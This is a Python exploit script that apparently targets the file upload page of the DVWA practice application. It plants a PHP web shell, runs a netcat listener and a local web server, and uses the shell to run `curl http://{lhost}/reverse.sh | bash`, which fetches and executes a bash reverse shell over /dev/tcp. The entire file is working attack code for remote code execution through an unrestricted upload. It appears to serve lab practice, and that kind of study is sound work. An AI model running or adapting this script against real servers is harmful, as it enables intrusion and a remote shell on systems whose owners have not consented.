#!/usr/bin/python3

import requests, subprocess, os, sys, time, re

#Colors
green = "\033[1;32;40m"
red = "\033[1;31;40m"
reset_color = "\033[0m"

if len(sys.argv) != 5:
	exit(f"{green}[+] Usage: python3 {sys.argv[0]} lhost lport rhost session_cookie{reset_color}")

#EXAMPLE
# python3 file_upload.py 192.168.56.21 443 http://192.168.56.13/vulnerabilities/upload/ hdd6nbffinh1uicmv5epk3ihht

#Global variables
lhost = sys.argv[1]
lport = sys.argv[2]
rhost = sys.argv[3]
session_cookie = sys.argv[4]
reverse_shell = "reverse.sh"
php_one_liner = "concha.php"


#Cookies
cookies = {"PHPSESSID": session_cookie, "security": "low"}

#Data
data = {"MAX_FILE_SIZE": 100000, "Upload": "Upload"} #This is data needed for the web form in order to upload the malicious file

def main():
	createPayload()
	uploadFile()
	setNClistener()
	setPythonWebServer()
	makeRequest()
	killPythonProcess()
	
def setNClistener():
	cmd = "nc -lvp 443"
	subprocess.Popen(cmd, shell=True)

def makeRequest():
    print(f"{green}[+] Making request{reset_color}")
    time.sleep(1)
    pattern = "([0-9]{1,3}\.){3}[0-9]{1,3}"
    ip = re.search(pattern, rhost).group()
    new_rhost = f"http://{ip}/hackable/uploads/{php_one_liner}?cmd=curl http://{lhost}/{reverse_shell} | bash"
    r = requests.get(new_rhost, cookies=cookies)

def createPayload():
	print(f"{green}[+] Creating php one liner{reset_color}")
	time.sleep(1)
	f = open(php_one_liner, "w")
	payload = "<?php system($_GET['cmd']); ?>"
	f.write(payload)
	f.close()
	print(f"{green}[+] Creating reverse bash shell{reset_color}")
	time.sleep(1)
	f = open(reverse_shell, "w")
	payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
	f.write(payload)
	f.close()

def setPythonWebServer():
	print(f"{green}[+] Setting Python Simple Web Server{reset_color}")
	time.sleep(1)
	os.system("python3 -m http.server 80 &")

def uploadFile():
	print(f"{green}[+] Uploading file{reset_color}")	
	time.sleep(1)
	r = requests.post(rhost, files={"uploaded": open(php_one_liner, "rb")}, cookies=cookies, data=data)

def killPythonProcess():
	os.system("kill -15 $(sudo lsof -i -n -P | grep -i python3 | awk '{print $2}')")

if __name__ == '__main__':
	main()
